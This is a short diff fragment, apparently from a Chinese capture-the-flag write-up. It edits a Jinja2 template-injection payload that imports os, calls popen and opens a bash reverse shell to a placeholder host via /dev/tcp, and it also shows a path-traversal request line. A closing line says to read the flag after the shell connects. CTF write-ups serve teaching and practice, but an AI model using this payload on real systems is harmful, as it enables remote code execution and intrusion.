@@ -14,6 +14,6 @@ POST /secret	HTTP/1.1/../../hello HTTP/1.1
 ……
 ……
 
-xscode={{lipsum.__globals__.__builtins__.__import__('os')['p''open']('bash+-c+"bash+-i+>%26+/dev/tcp/vps/port+0>%261"').read()}}
+xscode={{lipsum.__globals__.__builtins__.__import__('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/vps/port+0>%261"').read()}}
 ```
 反弹shell之后 `cat flag` 就行了
